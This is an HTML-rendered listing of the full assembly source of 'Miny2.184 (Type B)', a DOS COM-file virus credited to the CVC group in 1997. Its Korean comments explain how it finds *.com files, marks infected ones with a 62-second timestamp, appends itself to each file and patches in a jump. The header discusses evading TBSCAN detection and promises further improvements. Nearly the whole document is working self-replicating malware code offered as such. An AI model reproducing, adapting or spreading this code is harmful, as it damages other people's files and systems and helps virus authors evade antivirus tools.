<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>MINY2B.ASM</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;                                                               CVC #02  97/09</span><span class="sc0">
</span><span class="sc1">; Virus Name : Miny2.184 (Type B)</span><span class="sc0">
</span><span class="sc1">; Author : Osiris</span><span class="sc0">
</span><span class="sc1">; Group : CVC</span><span class="sc0">
</span><span class="sc1">; Date : 1997/08/17</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Type : Non-resident COM infector</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Miny2 (Type A) 의 개선판이다. 이버전에서는 A 형이 가지고 있던 에러발생시 처</span><span class="sc0">
</span><span class="sc1">; 리 루틴을 추가하였다. 이 버전에서 추가한 부분은 속성을 읽기/쓰기로 바꿀때</span><span class="sc0">
</span><span class="sc1">; 에러시 (주로 플로피 디스크가 쓰기 금지된 상태) 처리하는 부분이다.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; 다음버전은 COM 확장자를 가진 EXE 파일을 감염시키지 않는 버전을 선보이겠다.</span><span class="sc0">
</span><span class="sc1">; (예:DOS 7.0 의 COMMAND.COM)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; 여전히 다음과 같은 문제점이 존재한다.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; 1. TBSCAN 의 인공지능에 검색된다.</span><span class="sc0">
</span><span class="sc1">; 2. COM 확장자를 가진 EXE 파일을 감염시킨다.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;</span><span class="sc0">
            </span><span class="sc9">.MODEL</span><span class="sc0">  </span><span class="sc10">TINY</span><span class="sc0">
            </span><span class="sc9">.CODE</span><span class="sc0">

 </span><span class="sc5">Miny2</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">nop</span><span class="sc0">                         </span><span class="sc1">; 쓰레기값 (아무일도 안한다.)</span><span class="sc0">
            </span><span class="sc6">nop</span><span class="sc0">                         </span><span class="sc1">; 앞부분 복구시 바이러스가 파괴되기</span><span class="sc0">
            </span><span class="sc6">nop</span><span class="sc0">                         </span><span class="sc1">; 때문에 이 값을 넣었다.</span><span class="sc0">
 </span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">Next</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc5">Next</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">pop</span><span class="sc0">   </span><span class="sc8">bp</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">sub</span><span class="sc0">   </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Next</span><span class="sc0">        </span><span class="sc1">; BP = 바이러스 시작지점</span><span class="sc0">

            </span><span class="sc6">lea</span><span class="sc0">   </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">COM_head</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">               </span><span class="sc1">; COM 의 앞부분을 복구한다.</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">di</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">movsw</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">movsb</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0080h</span><span class="sc0">              </span><span class="sc1">; DTA 로 사용해 PSP 가 파괴되므로</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">0080h</span><span class="sc0">              </span><span class="sc1">; 잠시 저장한다.</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0">   </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">End_Virus</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">repz</span><span class="sc0">  </span><span class="sc6">movsb</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4Eh</span><span class="sc0">                </span><span class="sc1">; 파일 찾기</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">00100011B</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0">   </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">Match_COM</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc5">Find</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">int</span><span class="sc0">   </span><span class="sc2">21h</span><span class="sc0">
            </span><span class="sc6">jnc</span><span class="sc0">   </span><span class="sc5">ChkInfected</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc5">Restart</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0">   </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">End_Virus</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; 원래 DTA 복구</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">0080h</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0080h</span><span class="sc0">
            </span><span class="sc6">repz</span><span class="sc0">  </span><span class="sc6">movsb</span><span class="sc0">
            </span><span class="sc6">RET</span><span class="sc0">

 </span><span class="sc5">ChkInfected</span><span class="sc4">:</span><span class="sc0">                           </span><span class="sc1">; 감염 여부를 확인한다.</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">0096h</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; 62 초 인지 검사한다.</span><span class="sc0">
            </span><span class="sc6">and</span><span class="sc0">   </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1Fh</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0">   </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1Fh</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">Infect</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4Fh</span><span class="sc0">                </span><span class="sc1">; 다음 파일 찾기</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">Find</span><span class="sc0">
 </span><span class="sc5">Infect</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">              </span><span class="sc1">; 읽기/쓰기 속성으로 바꿈</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0">   </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">009Eh</span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0">   </span><span class="sc2">21h</span><span class="sc0">
            </span><span class="sc6">jc</span><span class="sc0">    </span><span class="sc5">Restart</span><span class="sc0">               </span><span class="sc1">; 에러시 DTA 복구후 종료</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3D02h</span><span class="sc0">              </span><span class="sc1">; 파일 오픈</span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0">   </span><span class="sc2">21h</span><span class="sc0">

            </span><span class="sc6">xchg</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                 </span><span class="sc1">; 파일 핸들 얻기</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5700h</span><span class="sc0">              </span><span class="sc1">; 파일 작성 시간 얻기</span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0">   </span><span class="sc2">21h</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">cx</span><span class="sc0">                    </span><span class="sc1">; 작성 시간 저장</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">                </span><span class="sc1">; 앞부분 읽기</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0">   </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">COM_Head</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; 버퍼 주소</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0003</span><span class="sc0">               </span><span class="sc1">; 3 바이트</span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0">   </span><span class="sc2">21h</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">02</span><span class="sc0">                 </span><span class="sc1">; 파일 끝으로 이동</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">lseek</span><span class="sc0">

            </span><span class="sc6">sub</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                  </span><span class="sc1">; 점프값 계산</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">JumpCode</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                </span><span class="sc1">; 바이러스 쓰기</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">End_virus</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0">   </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">start</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0">   </span><span class="sc2">21h</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc0">                 </span><span class="sc1">; 처음으로 이동</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">lseek</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                </span><span class="sc1">; 점프 코드 쓰기</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0003</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0">   </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">JumpCode</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0">   </span><span class="sc2">21h</span><span class="sc0">

            </span><span class="sc6">pop</span><span class="sc0">   </span><span class="sc8">dx</span><span class="sc0">                    </span><span class="sc1">; 파일 작성 시간 복구</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0">   </span><span class="sc8">cx</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">or</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,+</span><span class="sc2">1Fh</span><span class="sc0">               </span><span class="sc1">; 62 초로 만들기</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5701h</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0">   </span><span class="sc2">21h</span><span class="sc0">

 </span><span class="sc5">Close</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc0">                </span><span class="sc1">; 파일 닫기</span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0">   </span><span class="sc2">21h</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">Restart</span><span class="sc0">

 </span><span class="sc5">lseek</span><span class="sc4">:</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0">   </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0">   </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">42h</span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0">   </span><span class="sc2">21h</span><span class="sc0">
            </span><span class="sc6">ret</span><span class="sc0">

 </span><span class="sc5">COM_head</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">0CDh</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc0">          </span><span class="sc1">; COM 앞부분</span><span class="sc0">
 </span><span class="sc5">Match_COM</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc12">'*.com'</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc0">            </span><span class="sc1">; COM 파일 찾기</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc12">'Miny2'</span><span class="sc0">               </span><span class="sc1">; 미니 2</span><span class="sc0">
 </span><span class="sc5">JumpCode</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">0E9h</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">End_Virus</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc9">END</span><span class="sc0">   </span><span class="sc5">Miny2</span><span class="sc0">

</span></div></body>
</html>
